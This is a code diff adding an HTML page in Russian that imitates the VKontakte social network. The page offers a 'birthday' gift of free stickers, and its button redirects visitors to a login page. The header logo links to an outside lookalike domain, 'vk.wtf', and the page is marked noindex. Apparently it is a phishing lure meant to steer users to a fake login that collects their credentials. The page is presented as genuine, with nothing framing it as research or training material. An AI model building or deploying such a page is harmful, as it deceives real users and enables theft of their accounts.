@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href="https://vk.wtf/IQTMUjBI8E/login"><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                            <div class="container">
+                <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 56 56"><circle cx="28" cy="28" r="28" fill="#b676f7"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M35.186 16.108a.213.213 0 00-.371 0c-.32.582-.632 1.023-.905 1.408-.528.743-.91 1.282-.91 2.238a2 2 0 104 0c0-.957-.382-1.495-.91-2.238-.273-.385-.586-.826-.904-1.408zM16 26.754a2 2 0 012-2h20a2 2 0 012 2c0 1.958-.852 3.064-2 3.596l-.04.018c-.435.196-.911.31-1.4.359a5.699 5.699 0 01-.56.027c-2.991 0-3.994-1.988-4-2-.005.009-.475.94-1.727 1.529a4.642 4.642 0 01-.696.26c-.31.09-.655.156-1.038.189a6.336 6.336 0 01-.539.022c-2.991 0-3.994-1.988-4-2-.005.01-.487.965-1.776 1.551a4.652 4.652 0 01-.647.239c-.31.089-.655.155-1.038.188a6.336 6.336 0 01-.539.022c-2 0-4-1-4-4zm22 6.761a8.3 8.3 0 01-2 .239c-1.64 0-2.967-.413-4-.987-1.032.574-2.36.987-4 .987-1.64 0-2.967-.413-4-.987-1.032.574-2.36.987-4 .987a8.298 8.298 0 01-2-.239v1.414c0 1.12 0 1.68.218 2.108a2 2 0 00.874.874c.428.218.988.218 2.108.218h13.6c1.12 0 1.68 0 2.108-.218a2 2 0 00.874-.874c.218-.428.218-.988.218-2.108v-1.414zM20.814 16.108a.213.213 0 01.372 0c.318.582.63 1.023.904 1.408.528.743.91 1.282.91 2.238a2 2 0 11-4 0c0-.957.382-1.495.91-2.238.273-.385.586-.826.904-1.408zm7.372 0a.213.213 0 00-.372 0c-.318.582-.63 1.023-.904 1.408-.528.743-.91 1.282-.91 2.238a2 2 0 004 0c0-.957-.382-1.495-.91-2.238-.273-.385-.586-.826-.904-1.408z" fill="#fff"></path></svg>
+                <h1 class="title">Поздравляем с Днём Рождения!</h1>
+                <p class="subtitle">В честь этого вы можете получить случайный набор стикеров бесплатно.</p>
+                <button type="button" class="button"><span>Получить подарок</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+                                                            </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+              window.location.href = "/login";
+            }, 500);
+        });
+    </script>
+
+</body></html>
